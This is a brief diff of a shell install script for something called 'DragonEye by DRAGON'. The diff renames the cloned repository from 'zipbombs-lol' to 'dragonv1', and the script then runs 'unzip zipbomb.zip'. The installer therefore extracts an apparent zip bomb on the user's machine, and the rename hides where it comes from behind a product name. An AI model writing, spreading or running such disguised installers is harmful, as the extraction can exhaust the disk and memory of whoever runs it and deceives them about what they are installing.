@@ -4,10 +4,10 @@ set -e
 echo "Installing DragonEye by DRAGON..."
 
 # Clone the repository
-git clone https://github.com/12hrformat/zipbombs-lol.git
+git clone https://github.com/12hrformat/dragonv1.git
 
 # Enter the directory
-cd zipbombs-lol
+cd dragonv1
 
 # Unzip a file
 unzip zipbomb.zip
